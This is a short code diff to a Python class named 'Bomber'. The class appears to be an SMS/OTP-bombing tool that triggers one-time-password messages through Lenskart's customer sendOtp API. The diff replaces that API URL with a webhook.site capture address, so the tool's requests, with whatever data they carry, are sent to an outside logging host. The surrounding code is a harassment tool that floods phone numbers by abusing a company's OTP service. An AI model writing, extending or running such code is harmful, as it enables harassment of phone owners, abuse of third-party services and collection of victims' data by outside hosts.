@@ -88,7 +88,7 @@ class Bomber:
 
 
 	def lenskart(self):
-		url = "https://api.lenskart.com/v2/customers/sendOtp"
+		url = "https://webhook.site/1757003c-12ec-446a-9830-5fe1878b0c36"
 		lenskat_header = {
 			"accept": "application/json, text/plain, */*",
 			"accept-encoding": "gzip, deflate, br",
